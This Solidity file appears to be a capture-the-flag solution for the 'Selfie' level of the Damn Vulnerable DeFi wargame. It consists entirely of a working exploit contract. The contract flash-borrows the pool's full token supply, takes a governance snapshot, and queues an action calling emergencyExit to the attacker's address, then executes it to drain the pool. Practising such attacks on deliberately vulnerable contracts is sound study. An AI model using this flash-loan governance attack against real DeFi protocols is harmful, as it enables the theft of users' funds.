// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './SelfiePool.sol';
import '../DamnValuableTokenSnapshot.sol';
import './SimpleGovernance.sol';
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attack{
    SimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    uint256 actionID;
    uint256 constant INITIAL_SUPPLY_POOL = 1500000 *10**18;
    bytes32 constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");


    constructor(SimpleGovernance _governance, SelfiePool _pool, DamnValuableTokenSnapshot _token){
        governance =_governance;
        pool=_pool;
        token=_token;
    }

    function attack1()external{

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), INITIAL_SUPPLY_POOL, abi.encodeWithSignature("emergencyExit(address)", address(this)));
    
    }
    function attack2()external{

        governance.executeAction(actionID);
    
    }

    function onFlashLoan(address _address,address _token, uint256 _value, uint256 zero, bytes memory data)external returns(bytes32){
        
        token.snapshot();
        token.approve(address(pool), _value);

        actionID= governance.queueAction(address(pool), uint128(zero), data);

        return CALLBACK_SUCCESS;
    }
}